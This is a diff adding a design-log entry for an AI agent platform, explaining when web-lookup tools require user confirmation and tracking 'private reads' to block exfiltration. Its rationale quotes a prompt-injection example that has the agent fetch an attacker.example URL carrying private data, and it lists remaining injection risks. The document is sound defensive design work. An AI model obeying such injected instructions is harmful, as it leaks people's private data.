@@ -432,3 +432,39 @@ Actions variables are plaintext and often hold configuration values. Already inc
 
 Decided by the owner once the container sandbox was hardened: `bash` is offered only with a container sandbox (`sandbox.security.is_host_bash_allowed`), whose writable mounts are the thread's own folders, whose only egress is the registries proxy (`docker/sandbox-egress`: registry.npmjs.org, pypi.org, files.pythonhosted.org; GET/HEAD; 443), whose API takes a per-sandbox key (#98) and which runs under Docker's default seccomp profile (#99). Tools that act outside the sandbox keep their tiers.
 
+
+## 2026-10-24: web research — outbound tools escalate after a PRIVATE read, not after any content
+
+Owner decision. Before: `web_search`, `web_fetch` and `image_search` were Tier 1 in a clean turn and Tier 3 (`after_content`) once any tool result entered the turn. A plain research request ("find 5 great date-night restaurants in Philly with links") therefore became a confirmation card per lookup as soon as the first search came back.
+
+| Tool | Turn | Before | After | Direction |
+|---|---|---|---|---|
+| `web_search`, `web_fetch`, `image_search` | nothing read yet | T1 | T1 | unchanged |
+| `web_search`, `web_fetch`, `image_search` | only public web results read (search results, fetched pages, image results) | T3 (card, button-only) | T1 | **LESS STRICT** |
+| `web_search`, `web_fetch`, `image_search` | a private read returned data earlier in the turn (mail, calendar, Drive, any Composio connector, the ledger's projects/tasks/notes, the person's files, the session watcher, postgres, any MCP server tool, a delegate's or called agent's answer, any tool with no rule) | T3 | T3 | unchanged |
+| `web_search`, `web_fetch`, `image_search` | a delegate whose inviting turn had read private data; a run resumed after confirming calls from such a turn | T3 | T3 | unchanged (now explicit: the flag is inherited) |
+| `web_search`, `web_fetch`, `image_search` | an automation's (scheduled) turn | T3 | T3 | unchanged: an automation's turn counts as having read private data |
+| every other rule with `after_content` | any | as before | as before | unchanged: `after_content` itself is untouched |
+
+### Why
+
+Exfiltration needs two things in one turn: the person's private data in the model's hands, and a channel out. The outbound tools are the channel: an email or a page can tell the agent to fetch `https://attacker.example/?d=<private data>`, and the request is the leak whatever comes back. Untrusted content alone is not enough: a search result or a public page has nothing of the person's to put in a URL. Asking about every lookup after the first search taught approving without reading, which is the failure the tier model exists to prevent.
+
+### How it is decided (data-driven, fail-safe)
+
+* **What counts as a private read** is in the rules file: a rule's `reads_private: false` marks a tool whose result is not the person's data. Seven do: `web_search`, `web_fetch`, `image_search`, `ask_clarification`, `present_files`, `tool_search`, `write_todos`. Every other rule counts as a private read (unlabelled means yes), and so does a tool no rule names, a result whose tool cannot be told, and unreadable rules. `backend/tests/policy/test_web_research.py` pins the public list, so marking another tool public is a visible decision.
+* **The outbound set** is read from the rules too: every rule carrying an `after_private_read: true` exception (today the three above).
+* **Where it is tracked**: in the policy middleware (`app/policy/middleware.py`, `_private_read`), from the run's own message state by the same walk lineage makes for `after_content` (`app/policy/private_reads.py`): back from the call to the start of the turn (the person's server-tagged message, or a delegate's instruction). Three server-owned facts the walk cannot see are ORed in, each counting as "private" when absent: an automation's turn; for a delegate or @-called agent, its inviting turn (`invited_private_read`, set by the server, stripped from every run request); for a run resumed after a confirmation, the turn its calls were stated in (recorded on each pending action when it is stated). Nothing a run request carries can set or clear them.
+* A card stated after a private read is recorded with it, so a rules reload (`supersede`) keeps judging it as stated.
+
+### Grouped cards and the resume
+
+When several outbound calls of one turn wait, they are one group (`PendingActionResponse.group`): one card listing each call, with **Apply all** (`POST /api/confirmations/apply-all`, which for outbound cards claims what it can through the one confirmation path, runs them in one batch off the event loop, and resolves a call that raises as FAILED) and **Decline** per call. Once no card of the group is open, the lead resumes the turn on the server (`app/gateway/resume.py`, the #58 Continue machinery: one-shot locks spent only on success) with each call's outcome as a tool result, never the person's turn; the resumed run cannot answer a card.
+
+### Risks that remain
+
+* **The person's own message and context injected into the prompt are not counted as private reads**: if the person pastes private text into their message, or memory or an earlier-turn summary carries it into the system prompt, a lookup in that turn is still Tier 1. A prompt injection in a page read in that turn could make the agent put that text in a URL.
+* **Per turn, as decided**: private data read in an EARLIER turn of the same chat is still in the model's context, but does not escalate this turn's lookups.
+* **Public reads are still untrusted**: a page can still steer what the agent searches or fetches next in a clean turn (it just has nothing of the person's to send). The UI's zero-click defences (no images or previews from content, defanged links) are unchanged.
+* **Scheduled research is still all cards**: an automation's turn counts as private (its prompt can quote calendar or session data), so a research automation waits on cards as before.
+* Only lead-proposed outbound cards in a chat resume the turn; a delegate's card still uses Continue <agent>, and other Tier 3 cards still only post their result.
